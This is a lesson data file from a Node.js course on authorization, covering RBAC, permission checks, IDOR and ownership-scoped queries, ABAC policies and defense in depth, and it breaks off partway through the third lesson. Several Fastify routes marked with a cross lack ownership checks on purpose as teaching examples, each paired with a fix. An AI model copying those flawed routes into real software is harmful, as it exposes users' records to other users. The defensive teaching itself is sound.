import type { LessonDay } from "@/lib/learn/lesson-types";

export const NODEJS_DAY_19_LESSONS: LessonDay = {
  day: 19,
  title: "Authorization and API security",
  totalMinutes: 132,
  difficulty: "Intermediate",
  lessons: [
    {
      id: "rbac-roles-permissions",
      title: "RBAC, and roles versus permissions",
      durationMinutes: 11,
      explanation:
        "Day 18 got a user into the system. Today decides what they may touch.\n\n```text\nRequest → authentication → who is this?\n   ↓\nauthorization → can this user do this?\n   ↓\nbusiness logic → database\n```\n\n---\n\n## RBAC\n\n<b>RBAC (Role-Based Access Control)</b> (granting permissions through a named role assigned to the user).\n\n```text\nAdmin      → everything\nEditor     → create and update posts\nModerator  → moderate comments\nUser       → read and create their own content\n```\n\n```javascript\nif (user.role !== \"admin\") {\n  return reply.code(403).send({ error: \"Forbidden\" });\n}\n```\n\n> RBAC is the right starting point because it matches how organisations actually talk: someone <b>is</b> a moderator. The reason it eventually strains is that a role is a <b>guess about a group of permissions</b>, and the guess stops holding the first time one person needs an exception.\n\n---\n\n## Where roles break\n\nThe pressure always arrives the same way. One editor also needs to delete comments, so you add `editor_plus`. Then someone needs the reverse pair, so you add another. Six months later:\n\n```text\nadmin · editor · editor_plus · moderator · senior_moderator\nsupport · support_readonly · billing_admin · user\n```\n\n> Nine roles, and nobody can tell you what any of them do without reading the code. The failure is not the count, it is that <b>the meaning of a role now lives in scattered `if` statements</b> rather than anywhere you can inspect. Adding a tenth role is easy, and auditing who can delete a user is not.\n\n---\n\n## Permissions\n\n<b>Permission</b> (a single named action a user may perform).\n\n```text\nusers.read · users.delete · posts.update · comments.moderate\n```\n\nA role becomes a bundle of permissions rather than a synonym for a check:\n\n```text\nadmin     → every permission\neditor    → posts.read, posts.create, posts.update\nmoderator → comments.read, comments.moderate\n```\n\n> The change that matters is <b>what your code asks</b>. `if (user.role === \"admin\")` couples the route to an org chart. `if (can(user, \"users.delete\"))` couples it to the action it actually performs. Then granting one editor comment moderation is a row in a table rather than a new role and a deploy, and \"who can delete users?\" becomes a query instead of a code review.\n\n---\n\n## Checking permissions, not roles\n\n```javascript\nfunction can(user, permission) {\n  return user.permissions.includes(permission);\n}\n\napp.delete(\"/users/:id\", { preHandler: requirePermission(\"users.delete\") }, handler);\n```\n\n> Two practical notes. Put the permission list in the <b>session or the user row</b>, not the access token, because Day 18 showed a token's claims are stale the moment you change them. And be honest that this is still only half of authorization: `users.delete` says the user may delete <b>some</b> user, and says nothing about <b>which</b>. That second half is the next two lessons, and it is where the real bugs are.\n\n---\n\n## Deny by default\n\n> One structural rule worth more than the model you pick. <b>An unlisted permission is denied, and a route with no authorization declared should fail rather than pass.</b> If a new route is public until someone remembers to protect it, then the security of your API is the memory of whoever was in a hurry. Day 15's plugin scoping is how you get this: a subtree with the hook applied, so a route added there is protected by where it sits.",
      diagram: `Day 18 got the user in. Today: what may
they touch?

    request
       ↓
    authentication   who is this?
       ↓
    AUTHORIZATION    can they do this?
       ↓
    business logic → database


RBAC: the right starting point

    admin      everything
    editor     create/update posts
    moderator  moderate comments
    user       own content

    it matches how organisations TALK.
    someone IS a moderator.

    ⚠ it strains because a role is a GUESS ABOUT
      A GROUP OF PERMISSIONS, and the guess stops
      holding the first time one person needs an
      exception.


How roles break, always the same way

    one editor also deletes comments
      → add editor_plus
    someone needs the reverse pair
      → add another

    six months:

      admin · editor · editor_plus
      moderator · senior_moderator
      support · support_readonly
      billing_admin · user

    nine roles, and nobody can tell you what any
    of them DO without reading the code.

    the failure is not the COUNT. it is that the
    meaning of a role now lives in SCATTERED IF
    STATEMENTS instead of anywhere inspectable.

    adding a tenth role: easy.
    auditing who can delete a user: not.


Permissions: one named action

    users.read · users.delete
    posts.update · comments.moderate

    a role becomes a BUNDLE, not a synonym for
    a check.


What actually changes: WHAT YOUR CODE ASKS

    if (user.role === "admin")
      couples the route to an ORG CHART

    if (can(user, "users.delete"))
      couples it to the ACTION IT PERFORMS

    then:
      granting one editor moderation
        = a row in a table
        not a new role and a deploy

      "who can delete users?"
        = a QUERY
        not a code review


⚠ Two practical notes

    put the permission list in the SESSION or the
    USER ROW, not the access token.
      Day 18: a token's claims are stale the
      moment you change them.

    and be honest: this is HALF of authorization.

      users.delete says the user may delete SOME
      user.

      it says nothing about WHICH.

      → that half is the next two lessons, and it
        is where the real bugs are.


⚠ Deny by default

    worth more than the model you pick:

      an unlisted permission is DENIED

      a route with NO authorization declared
      should FAIL, not pass

    if a new route is public until somebody
    remembers to protect it, the security of your
    API is the memory of whoever was in a hurry.

    Day 15's plugin scoping is how you get this:
    a subtree with the hook applied, so a route
    is protected by WHERE IT SITS.`,
      codeExample: {
        title: "From role checks to permission checks",
        code: `import fp from "fastify-plugin";
import { and, eq } from "drizzle-orm";


// ── Stage 1: role checks. Fine, at first. ───────────────────
app.delete("/users/:id", { preHandler: authenticate }, async (request, reply) => {
  if (request.user.role !== "admin") {
    return reply.code(403).send({ error: "Forbidden" });
  }
  // ...
});
//
// Works. And every route now contains a claim about your org
// chart, so the day one editor needs to delete a comment you
// are editing routes rather than data.


// ── Stage 2: permissions ────────────────────────────────────
// role_permissions
//   role · permission
//     admin      users.read, users.delete, posts.*, comments.*
//     editor     posts.read, posts.create, posts.update
//     moderator  comments.read, comments.moderate
//
// user_permissions          ← the escape hatch that removes
//   user_id · permission      the need for editor_plus
//     17     comments.moderate

const PERMISSIONS = [
  "users.read", "users.create", "users.update", "users.delete",
  "posts.read", "posts.create", "posts.update", "posts.delete",
  "comments.read", "comments.moderate",
] as const;
// A closed list. An unlisted permission cannot be granted by
// a typo, and a Zod enum over this gives you the same
// guarantee at any admin endpoint that assigns them.

async function loadPermissions(db, userId) {
  const rows = await db
    .select({ permission: rolePermissions.permission })
    .from(users)
    .innerJoin(rolePermissions, eq(rolePermissions.role, users.role))
    .where(eq(users.id, userId))
    .union(
      db.select({ permission: userPermissions.permission })
        .from(userPermissions)
        .where(eq(userPermissions.userId, userId)),
    );
  return new Set(rows.map((r) => r.permission));
}


// ── The hook ────────────────────────────────────────────────
export default fp(async function authz(app) {
  app.decorateRequest("permissions", null);

  // Resolved once per request, on the session, alongside the
  // user. Day 18: NOT from the access token, because a
  // permission you revoke must take effect on the next
  // request rather than in fifteen minutes.
  app.addHook("preHandler", async (request) => {
    if (request.user) {
      request.permissions = await loadPermissions(app.db, request.user.id);
    }
  });

  app.decorate("requirePermission", (permission) => {
    return async function check(request, reply) {
      if (!request.permissions?.has(permission)) {
        request.log.warn({
          userId: request.user?.id, permission, url: request.url,
        }, "permission denied");
        return reply.code(403).send({ error: "Forbidden" });
      }
    };
  });
});


// ── Using it ────────────────────────────────────────────────
app.delete("/users/:id", {
  preHandler: [authenticate, app.requirePermission("users.delete")],
}, async (request, reply) => {
  // ...
});
//
// The route now declares the action it performs. Which is
// also documentation: reading the route tells you what
// permission it needs, and no reader has to know what
// "admin" means this month.


// ── ✓ Deny by default, structurally ─────────────────────────
// ✗ A global hook with exemptions inverts the default.
app.addHook("preHandler", async (request, reply) => {
  const PUBLIC = ["/login", "/register", "/health"];
  if (PUBLIC.includes(request.url)) return;
  return authenticate(request, reply);
});
// A new public route works immediately. A new PRIVATE route
// works immediately too, which is the problem: forgetting to
// protect it produces no error, no test failure and no diff
// that looks wrong.

// ✓ Day 15's scoping. Where the route sits IS the decision.
app.register(async (publicRoutes) => {
  publicRoutes.post("/login", loginHandler);
  publicRoutes.post("/register", registerHandler);
  publicRoutes.get("/health", healthHandler);
});

app.register(async (api) => {
  api.addHook("preHandler", authenticate);

  api.get("/me", meHandler);

  api.register(async (admin) => {
    admin.addHook("preHandler", api.requirePermission("users.read"));
    admin.get("/users", listUsersHandler);
    admin.delete("/users/:id", {
      preHandler: api.requirePermission("users.delete"),
    }, deleteUserHandler);
  });
});
// A route added inside the second block is authenticated
// because of its location. Encapsulation from Day 15, doing
// security work.


// ── The test that makes deny-by-default real ────────────────
import { test } from "node:test";
import assert from "node:assert/strict";

test("every route except the allowlist requires authentication", async (t) => {
  const app = buildApp({ logger: false });
  t.after(() => app.close());
  await app.ready();

  const PUBLIC = new Set(["/login", "/register", "/health"]);

  // Fastify can tell you its own routes.
  const routes = app.printRoutes({ commonPrefix: false })
    .split("\\n").filter(Boolean);

  for (const line of routes) {
    const url = extractUrl(line);
    if (PUBLIC.has(url)) continue;

    const res = await app.inject({ method: "GET", url });
    assert.notEqual(res.statusCode, 200,
      \`\${url} answered 200 with no credentials\`);
  }
});
// This is the highest-value test in the whole day. It fails
// the moment someone adds an unprotected route, which is the
// only point at which you could have caught it. Compare with
// Day 17's query-count test: both assert a property of the
// system rather than the behaviour of one function.


// ── ⚠ And the half this lesson does not solve ───────────────
app.delete("/posts/:id", {
  preHandler: [authenticate, app.requirePermission("posts.delete")],
}, async (request) => {
  await db.delete(posts).where(eq(posts.id, request.params.id));
  return { deleted: true };
});
//
// The permission check passed. Any user with posts.delete can
// delete ANY post, including yours.
//
// "May this user delete a post?" and "may this user delete
// THIS post?" are different questions, and only the first one
// has been asked. The next lesson is the second one.`,
      },
      keyTakeaways: [
        "RBAC is the right starting point because it matches how organisations talk about people.",
        "It strains because a role is a guess about a group of permissions, and the guess fails at the first exception.",
        "The problem with nine roles is not the count, it is that their meaning lives in scattered `if` statements instead of anywhere inspectable.",
        "Permissions change what your code asks: `can(user, \"users.delete\")` couples a route to the action it performs rather than to an org chart.",
        "Then a one-off grant is a table row instead of a new role and a deploy, and \"who can delete users?\" is a query.",
        "Keep the permission list in the session or user row, not the access token, because Day 18 showed token claims go stale.",
        "A closed list of permission strings means a typo cannot grant something, and a Zod enum enforces it at the admin endpoint.",
        "Deny by default is worth more than the model: a route with no authorization declared should fail, not pass.",
        "Get that from plugin scoping rather than a global hook with exemptions, so a route is protected by where it sits.",
        "A test that walks `printRoutes` and asserts every non-public route rejects an anonymous request is the highest-value test in this day.",
        "A permission check answers whether the user may delete some post. It says nothing about which one.",
      ],
      commonMistakes: [
        "Adding a role for every exception, until nobody can say what any role means without reading the code.",
        "Checking `user.role === \"admin\"` in handlers, which couples every route to your org chart.",
        "Putting permissions in the access token, so revoking one takes effect in fifteen minutes rather than immediately.",
        "A global auth hook with a public-path allowlist. A new private route is then public until someone remembers.",
        "Accepting arbitrary permission strings from an admin endpoint, so a typo silently grants nothing or something unintended.",
        "Believing a permission check is authorization. It answers \"may they do this kind of thing\", not \"may they do it to this record\".",
        "Never writing the route-coverage test, so an unprotected route is caught by a user rather than by CI.",
      ],
      quiz: [
        {
          question: "What is the actual problem with accumulating nine roles?",
          options: [
            "Database size",
            "Their meaning lives in scattered `if` statements, so adding a role is easy and auditing who can delete a user is not",
            "Roles are slower than permissions",
            "Nine is beyond what RBAC supports",
          ],
          correctIndex: 1,
          explanation:
            "The count is a symptom. The problem is that the definition is not anywhere you can inspect or query.",
        },
        {
          question: "What changes when you check permissions rather than roles?",
          options: [
            "Nothing meaningful",
            "The route couples to the action it performs instead of an org chart, so a one-off grant is a table row rather than a new role and a deploy",
            "It is faster",
            "You no longer need authentication",
          ],
          correctIndex: 1,
          explanation:
            "And \"who can delete users?\" becomes a query rather than a code review.",
        },
        {
          question: "Why keep the permission list in the session rather than the access token?",
          options: [
            "Tokens are too small",
            "Day 18's revocation problem: a token's claims are stale, so a revoked permission would keep working until the token expires",
            "Tokens cannot hold arrays",
            "It is faster to read",
          ],
          correctIndex: 1,
          explanation:
            "Revoking a permission has to take effect on the next request, not in fifteen minutes.",
        },
        {
          question: "Why prefer plugin scoping over a global auth hook with a public-path allowlist?",
          options: [
            "Performance",
            "It makes deny-by-default structural: a new route is protected because of where it sits, rather than because someone remembered",
            "Global hooks are deprecated",
            "Allowlists cannot be tested",
          ],
          correctIndex: 1,
          explanation:
            "With an allowlist, forgetting to protect a route produces no error, no failing test and no suspicious-looking diff.",
        },
        {
          question: "A route checks `posts.delete` and then deletes by id. What is still missing?",
          options: [
            "Nothing",
            "Which post. The permission says the user may delete some post, not that they may delete this one.",
            "A response schema",
            "Rate limiting",
          ],
          correctIndex: 1,
          explanation:
            "Those are two different questions, and only the first has been asked. That gap is the next lesson.",
        },
      ],
    },
    {
      id: "resource-authorization",
      title: "Resource authorization and IDOR",
      durationMinutes: 12,
      explanation:
        "This is the most common serious bug in web applications, and the code that contains it looks correct.\n\n---\n\n## IDOR\n\n<b>IDOR (Insecure Direct Object Reference)</b> (a vulnerability where changing an identifier in a request gives a user access to another user's resource).\n\n```text\nGET /invoices/100     yours\nGET /invoices/101     someone else's, returned anyway\n```\n\n> The URL is not the problem, and hiding the id does not fix it. The problem is that the server answered <b>\"does this record exist?\"</b> when the question was <b>\"does this record exist and belong to the caller?\"</b>. Those are one `AND` apart in SQL and a world apart in consequence.\n\n---\n\n## Why it is so common\n\n```javascript\napp.get(\"/posts/:id\", { preHandler: authenticate }, async (request) => {\n  return db.select().from(posts).where(eq(posts.id, request.params.id));\n});\n```\n\n> Look at what makes this survive review. There <b>is</b> a `preHandler`. The route <b>is</b> authenticated. It has a params schema, a response schema, tests that pass, and a reviewer who sees `authenticate` and moves on. Nothing about the code looks unfinished, and a missing check has no syntax.\n>\n> That is the difference between this and SQL injection: injection looks alarming and this looks finished.\n\n---\n\n## The ownership-aware query\n\n```javascript\nconst [post] = await db\n  .select()\n  .from(posts)\n  .where(and(eq(posts.id, id), eq(posts.userId, request.user.id)));\n```\n\n> Put the predicate in the query rather than in an `if` afterwards, and you get three things. The check cannot be <b>forgotten</b>, because there is no code path that fetches without it. It cannot be <b>bypassed</b> by an early return added later. And it produces a <b>404</b> instead of a 403, which matters more than it sounds.\n\n---\n\n## 403 or 404\n\n```text\n403 Forbidden  →  \"this exists, and it is not yours\"\n404 Not Found  →  \"nothing here\"\n```\n\n> A 403 is an honest answer and an information leak. Iterating ids against an endpoint that returns 403 for real records and 404 for absent ones tells an attacker <b>exactly which ids exist</b>, which is often the valuable part: how many customers you have, whether a particular company is one, whether invoice 8000 exists yet.\n>\n> So return 404 for a resource that is not yours. Use 403 when the caller may know the resource exists, such as a team member lacking one permission on a document they can already see.\n\n---\n\n## The endpoints people forget\n\n> Fixing the single-record read is the easy part. Four others carry the same bug and get less attention.\n>\n> <b>Lists.</b> `GET /posts` must filter by owner, and the tempting bug is filtering in JavaScript after fetching everything, which still ships the whole table into memory and leaks through pagination counts.\n>\n> <b>Nested resources.</b> `GET /posts/:postId/comments/:id` needs the comment to belong to the post <b>and</b> the post to belong to the user. Checking only the comment lets a caller read a comment through a post they do not own.\n>\n> <b>Writes.</b> Day 17's rule: an `UPDATE` or `DELETE` needs the ownership predicate in its own `WHERE`, and you must check the affected row count, because zero rows is a 404 and not a success.\n>\n> <b>Creates.</b> `POST /posts` with `{ userId: 7 }` in the body is Day 16's mass assignment: take the owner from the session, never from the payload.",
      diagram: `IDOR: one AND apart

    GET /invoices/100   yours
    GET /invoices/101   someone else's, returned

    the URL is not the problem.
    hiding the id does not fix it.

    the server answered
      "does this record EXIST?"

    when the question was
      "does it exist AND BELONG TO THE CALLER?"

    one AND apart in SQL.
    a world apart in consequence.


⚠ Why it survives review

    app.get("/posts/:id",
      { preHandler: authenticate },
      async (req) => db.select().from(posts)
        .where(eq(posts.id, req.params.id)));

    there IS a preHandler.
    the route IS authenticated.
    params schema ✓  response schema ✓
    tests pass ✓
    reviewer sees "authenticate" and moves on ✓

    nothing looks unfinished, and A MISSING CHECK
    HAS NO SYNTAX.

    that is the difference from SQL injection:
      injection LOOKS ALARMING
      this LOOKS FINISHED


The fix, and what the placement buys

    .where(and(
      eq(posts.id, id),
      eq(posts.userId, req.user.id)))

    in the QUERY, not an if afterwards:

      1. cannot be FORGOTTEN
         no path fetches without it
      2. cannot be BYPASSED
         by an early return added later
      3. produces 404, not 403


403 or 404

    403   "this exists, and it is not yours"
    404   "nothing here"

    ⚠ a 403 is an honest answer AND an
      information leak.

      iterate ids: 403 for real records, 404 for
      absent ones

      → you have just published EXACTLY WHICH IDS
        EXIST

        how many customers you have
        whether a given company is one
        whether invoice 8000 exists yet

    → 404 for "not yours"

    403 when the caller MAY know it exists:
      a team member lacking one permission on a
      document they can already see


⚠ The four endpoints people forget

    the single-record read is the EASY part.

    LISTS
      GET /posts must filter by owner
      tempting bug: filter in JS after fetching
        everything
        → still ships the whole table into memory
        → still leaks via pagination counts

    NESTED
      /posts/:postId/comments/:id
      the comment must belong to the post
      AND the post to the user
      → checking only the comment lets a caller
        read through a post they do not own

    WRITES
      Day 17: the predicate goes in the WHERE
      and CHECK THE ROW COUNT
      zero rows is a 404, not a success

    CREATES
      POST /posts with { userId: 7 } in the body
      = Day 16's mass assignment
      → owner comes from the SESSION, never the
        payload`,
      codeExample: {
        title: "Every shape of the same bug",
        code: `import { and, eq, inArray, isNull, sql } from "drizzle-orm";


// ── ✗ 1. The single read ────────────────────────────────────
app.get("/posts/:id", { preHandler: authenticate }, async (request) => {
  const [post] = await db.select().from(posts)
    .where(eq(posts.id, request.params.id));
  return post;
});
// GET /posts/1  as user 10  ->  200, user 20's post.

// ── ✓ ────────────────────────────────────────────────────────
app.get("/posts/:id", {
  preHandler: authenticate,
  schema: {
    params: z.object({ id: z.coerce.number().int().positive() }),
    response: { 200: postResponseSchema, 404: errorSchema },
  },
}, async (request, reply) => {
  const [post] = await db.select().from(posts).where(and(
    eq(posts.id, request.params.id),
    eq(posts.userId, request.user.id),
  ));

  if (!post) return reply.code(404).send({ error: "Not found" });
  return post;
});


// ── ✗ 2. The list, filtered in the wrong place ──────────────
app.get("/posts", { preHandler: authenticate }, async (request) => {
  const all = await db.select().from(posts);
  return all.filter((p) => p.userId === request.user.id);
});
// The response is correct. Everything else is wrong:
//   · the whole table is in your heap (Day 17)
//   · a total count, if you add one, counts everyone's
//   · one forgotten .filter() somewhere else leaks the lot
//
// And the shape invites the bug: the data arrives unfiltered
// and stays that way until somebody remembers.

// ── ✓ Filter in the query ───────────────────────────────────
app.get("/posts", {
  preHandler: authenticate,
  schema: {
    querystring: z.object({
      page: z.coerce.number().int().positive().default(1),
      limit: z.coerce.number().int().positive().max(100).default(20),
    }),
  },
}, async (request) => {
  const { page, limit } = request.query;
  return db.select().from(posts)
    .where(and(eq(posts.userId, request.user.id), isNull(posts.deletedAt)))
    .limit(limit)
    .offset((page - 1) * limit);
});


// ── ✗ 3. Nested resources, checked one level too shallow ────
app.get("/posts/:postId/comments/:id", { preHandler: authenticate },
  async (request) => {
    const [comment] = await db.select().from(comments).where(and(
      eq(comments.id, request.params.id),
      eq(comments.postId, request.params.postId),
    ));
    return comment;
  });
//
// Both ids are checked against each other, which FEELS
// thorough. Nobody checked that the post belongs to the
// caller, so any user can read any comment by supplying its
// real post id.

// ── ✓ Join up to the owner ──────────────────────────────────
app.get("/posts/:postId/comments/:id", {
  preHandler: authenticate,
  schema: { params: z.object({
    postId: z.coerce.number().int().positive(),
    id: z.coerce.number().int().positive(),
  }) },
}, async (request, reply) => {
  const [row] = await db
    .select({ comment: comments })
    .from(comments)
    .innerJoin(posts, eq(comments.postId, posts.id))
    .where(and(
      eq(comments.id, request.params.id),
      eq(comments.postId, request.params.postId),
      eq(posts.userId, request.user.id),      // ← up to the owner
    ));

  if (!row) return reply.code(404).send({ error: "Not found" });
  return row.comment;
});
// The join is the authorization. Day 17's joins lesson, used
// for something other than performance.


// ── ✗ 4. Writes ─────────────────────────────────────────────
app.delete("/posts/:id", { preHandler: authenticate }, async (request) => {
  await db.delete(posts).where(eq(posts.id, request.params.id));
  return { deleted: true };
});
// Deletes anyone's post, and reports success either way.

// ── ✓ Predicate plus row count ──────────────────────────────
app.delete("/posts/:id", {
  preHandler: authenticate,
  schema: { params: z.object({ id: z.coerce.number().int().positive() }) },
}, async (request, reply) => {
  const deleted = await db.delete(posts).where(and(
    eq(posts.id, request.params.id),
    eq(posts.userId, request.user.id),
  )).returning({ id: posts.id });

  if (deleted.length === 0) return reply.code(404).send({ error: "Not found" });
  return { deleted: true };
});
// Day 17: zero rows changed is usually a 404, not a success.
// Without the row count you return 200 for a delete that did
// nothing, and the client shows a confirmation.


// ── ✗ 5. Creates: the owner from the payload ────────────────
app.post("/posts", {
  preHandler: authenticate,
  schema: { body: z.object({
    title: z.string(), body: z.string(), userId: z.number(),
  }) },
}, async (request) => {
  return db.insert(posts).values(request.body).returning();
});
// The client chose the author. Day 16's mass assignment, now
// with an authorization consequence: post as anyone.

// ── ✓ Owner from the session ────────────────────────────────
app.post("/posts", {
  preHandler: authenticate,
  schema: {
    body: z.object({ title: z.string().min(1).max(200), body: z.string().min(1) }),
    //     ^^ no userId. It is not a client input.
    response: { 201: postResponseSchema },
  },
}, async (request, reply) => {
  const [created] = await db.insert(posts).values({
    title: request.body.title,
    body: request.body.body,
    userId: request.user.id,        // ← the only source of truth
  }).returning();

  return reply.code(201).send(created);
});


// ── The helper that makes the pattern hard to skip ──────────
// If ownership is one call, the correct version is the short
// one, which is the only version anybody consistently writes.
function ownedBy(table, userId) {
  return eq(table.userId, userId);
}

const [post] = await db.select().from(posts)
  .where(and(eq(posts.id, id), ownedBy(posts, request.user.id)));


// ── The test worth writing for every resource route ─────────
test("a user cannot read another user's post", async (t) => {
  const app = buildApp({ logger: false });
  t.after(() => app.close());

  const a = await createUserAndLogin(app, "a@example.com");
  const b = await createUserAndLogin(app, "b@example.com");

  const created = await app.inject({
    method: "POST", url: "/posts",
    headers: { authorization: \`Bearer \${b.token}\` },
    payload: { title: "B's post", body: "..." },
  });
  const bPostId = created.json().id;

  const res = await app.inject({
    url: \`/posts/\${bPostId}\`,
    headers: { authorization: \`Bearer \${a.token}\` },
  });

  assert.equal(res.statusCode, 404);
  assert.equal(res.body.includes("B's post"), false);
});
// Two users and one cross-read. It takes ten minutes to write
// the helpers and it catches the single most common serious
// bug in web applications, on every route you point it at.
//
// Note it asserts 404 rather than 403, so the test also
// enforces that you are not leaking which ids exist.`,
      },
      keyTakeaways: [
        "IDOR happens because the server answered \"does this record exist?\" when the question was \"does it exist and belong to the caller?\".",
        "The URL is not the problem, and hiding or randomising the id does not fix it.",
        "It survives review because the route is authenticated, schema-validated and tested, and a missing check has no syntax. Injection looks alarming; this looks finished.",
        "Put the ownership predicate in the query. It cannot be forgotten, cannot be bypassed by a later early return, and yields 404 rather than 403.",
        "403 for someone else's record leaks which ids exist, which is often the valuable information. Return 404.",
        "Use 403 only when the caller may legitimately know the resource exists, such as lacking one permission on a shared document.",
        "Lists must filter in the query. Filtering in JavaScript ships the whole table and leaks through counts.",
        "Nested resources need the chain checked up to the owner. Matching the comment to the post feels thorough and is not.",
        "Writes need the predicate in their own `WHERE` plus a row-count check, because zero rows changed is a 404, not a success.",
        "Creates must take the owner from the session. `userId` in the body is Day 16's mass assignment with an authorization consequence.",
        "Make ownership a one-call helper, so the correct version is the shortest one to write.",
        "A two-user cross-read test on every resource route catches the most common serious bug in web applications, and asserting 404 also enforces no id leak.",
      ],
      commonMistakes: [
        "Fetching by id and checking ownership in an `if` afterwards. Eventually a code path fetches and forgets.",
        "Returning 403 for a record that is not yours, which confirms it exists and lets an attacker enumerate ids.",
        "Filtering a list in JavaScript. The response is right and the whole table was still loaded, and counts still leak.",
        "Checking a nested id against its parent id without checking the parent's owner.",
        "Deleting or updating without the ownership predicate, or without checking the affected row count.",
        "Accepting `userId` in a create payload, letting a client post as anyone.",
        "Assuming an authenticated route is an authorized one, which is exactly what makes this bug invisible in review.",
        "Never writing the cross-user test, so this is found by a user or a researcher rather than CI.",
      ],
      quiz: [
        {
          question: "Why does an IDOR survive code review so reliably?",
          options: [
            "Reviewers are careless",
            "The route is authenticated, schema-validated and tested, and a missing check has no syntax, so nothing looks unfinished",
            "It only appears under load",
            "The bug is in a library",
          ],
          correctIndex: 1,
          explanation:
            "Injection looks alarming and this looks finished. That difference is why it is the more common bug.",
        },
        {
          question: "Why return 404 rather than 403 for someone else's record?",
          options: [
            "403 is deprecated",
            "403 confirms the record exists, so iterating ids reveals exactly which ones do, which is often the valuable information",
            "404 is faster",
            "Clients handle 404 better",
          ],
          correctIndex: 1,
          explanation:
            "Use 403 only when the caller may legitimately know it exists, such as lacking one permission on a document they can already see.",
        },
        {
          question: "What is wrong with fetching all posts and filtering by owner in JavaScript?",
          options: [
            "Nothing, the response is correct",
            "The whole table lands in your heap, counts still include other users, and one forgotten filter elsewhere leaks everything",
            "It is a syntax error",
            "Drizzle does not support it",
          ],
          correctIndex: 1,
          explanation:
            "The shape invites the bug: data arrives unfiltered and stays that way until somebody remembers.",
        },
        {
          question: "`GET /posts/:postId/comments/:id` checks the comment belongs to the post. What is missing?",
          options: [
            "Nothing",
            "That the post belongs to the caller. Otherwise any user reads any comment by supplying its real post id.",
            "A response schema",
            "Pagination",
          ],
          correctIndex: 1,
          explanation:
            "Join up to the owner. Matching the child to the parent feels thorough and checks nothing about the caller.",
        },
        {
          question: "Why does a delete need a row-count check as well as an ownership predicate?",
          options: [
            "For logging",
            "Zero rows changed means it was not theirs or does not exist, which is a 404, not the 200 the client will otherwise show as a confirmation",
            "To detect deadlocks",
            "Drizzle requires it",
          ],
          correctIndex: 1,
          explanation:
            "Day 17's rule with an authorization consequence: report on what actually happened, not on the absence of an error.",
        },
      ],
    },
    {
      id: "policies-and-defense-in-depth",
      title: "Policies, ABAC and defense in depth",
      durationMinutes: 11,
      explanation:
        "Ownership covers one case. Real applications have shared documents, team membership and roles that apply to a resource rather than a user.\n\n---\n\n## ABAC\n\n<b>ABAC (Attribute-Based Access Control)</b> (deciding access from attributes of the user, the resource and the request rather than from a role alone).\n\n```text\nuser.department === resource.department  →  allow\notherwise                                →  deny\n```\n\n> The shift is from <b>\"is this user an admin?\"</b> to <b>\"do these attributes satisfy the policy?\"</b>, and the reason it matters is that most real rules involve the resource. \"An editor may publish a post in a section they own, before the embargo date, unless it is locked\" cannot be expressed as a role, because three of those four conditions are properties of the post.\n\n---\n\n## Policies\n\n<b>Policy</b> (a named function that answers whether one user may perform one action on one resource).\n\n```javascript\nconst postPolicy = {\n  view: (user, post) => post.userId === user.id || post.published,\n  update: (user, post) => post.userId === user.id && !post.locked,\n  delete: (user, post) => post.userId === user.id || user.permissions.has(\"posts.delete\"),\n};\n```\n\n> Two things make this worth the indirection. The rule lives in <b>one place</b>, so you can read it, test it and change it without touching routes. And it is <b>testable without HTTP</b>: `postPolicy.update(user, post)` is a pure function, so you can cover twenty combinations in twenty lines rather than twenty `inject` calls.\n>\n> The honest cost is that a policy needs the resource loaded, which is one query before the decision. Fine for a single record and unusable for a list, which is why ownership stays in the query for lists.\n\n---\n\n## Two kinds of check, and both are needed\n\n```text\nIn the query   scales to lists. cannot express complex rules.\nIn a policy    expresses complex rules. needs the row loaded.\n```\n\n> A useful division: <b>the query narrows to what the caller could possibly touch, and the policy decides the specific action</b>. So a list is scoped by the query, and an update fetches within that scope and then asks the policy whether this particular edit is allowed.\n\n---\n\n## Defense in depth\n\n<b>Defense in depth</b> (independent layers of control, so one mistake does not fully expose the system).\n\n```text\nauthentication → the caller is real\npermission     → this kind of action is allowed\npolicy         → this action on this resource is allowed\nquery scope    → the row could not be reached anyway\nDB constraint  → the write is impossible even if all four fail\nresponse schema→ nothing extra leaves even if a row is wrong\n```\n\n> The point is not paranoia, it is that these layers <b>fail independently</b>. A forgotten policy call is caught by the query scope. A wrong query is caught by the response schema, which Day 16 verified strips undeclared fields. And a foreign key or a `CHECK` constraint holds even against a script that bypasses your API entirely, which no application-layer check can claim.\n>\n> The layer people skip is the last one. Day 17's point: a guarantee in the database is the only guarantee that also applies to migrations, admin scripts and the next service.\n\n---\n\n## Row-level security\n\n> Worth knowing that PostgreSQL can enforce this itself, with `ROW LEVEL SECURITY` and a policy on the table, so a row the current role may not see does not exist for <b>any</b> query. That is the strongest version of this idea and the most operationally demanding, because your connection has to carry the user's identity. Pooling makes that awkward, which is why most Node applications keep the check in the query instead. Know it exists before you decide you cannot use it.",
      diagram: `ABAC: the resource is part of the rule

    "is this user an admin?"
        ↓
    "do these attributes satisfy the policy?"

    most real rules involve the RESOURCE:

      "an editor may publish a post
        in a section they own,
        before the embargo date,
        unless it is locked"

      three of those four conditions are
      properties of THE POST.

      that cannot be a role.


Policy: one user, one action, one resource

    view:   (u,p) => p.userId===u.id || p.published
    update: (u,p) => p.userId===u.id && !p.locked
    delete: (u,p) => p.userId===u.id
                     || u.permissions.has("posts.delete")

    worth the indirection because:

      1. the rule lives in ONE PLACE
         readable, testable, changeable without
         touching routes

      2. TESTABLE WITHOUT HTTP
         a pure function
         → 20 combinations in 20 lines
           instead of 20 inject() calls

    ⚠ honest cost: a policy needs the resource
      LOADED. one query before the decision.

      fine for one record.
      unusable for a list.


Two kinds of check. Both needed.

    IN THE QUERY
      ✓ scales to lists
      ✗ cannot express complex rules

    IN A POLICY
      ✓ expresses complex rules
      ✗ needs the row loaded

    the division:

      the QUERY narrows to what the caller could
      possibly touch

      the POLICY decides the specific action

    → lists are scoped by the query
      updates fetch within scope, then ask


Defense in depth: layers that fail INDEPENDENTLY

    authentication    the caller is real
    permission        this KIND of action
    policy            this action on THIS resource
    query scope       the row was unreachable anyway
    DB constraint     the write is impossible even
                        if all four fail
    response schema   nothing extra leaves even if
                        the row is wrong

    not paranoia. INDEPENDENCE.

      a forgotten policy call
        → caught by the query scope
      a wrong query
        → caught by the response schema
          (Day 16 verified it strips undeclared
           fields)
      a script that bypasses your API entirely
        → caught by the foreign key

    ⚠ the layer people skip is the LAST one.

      Day 17: a guarantee in the DATABASE is the
      only guarantee that also applies to
      migrations, admin scripts and the next
      service.


Row-level security: the strongest version

    Postgres can enforce this itself.

      ROW LEVEL SECURITY + a policy on the table
      → a row the current role may not see does
        not exist for ANY query

    strongest, and most operationally demanding:
    your connection must carry the user's
    identity, which pooling makes awkward.

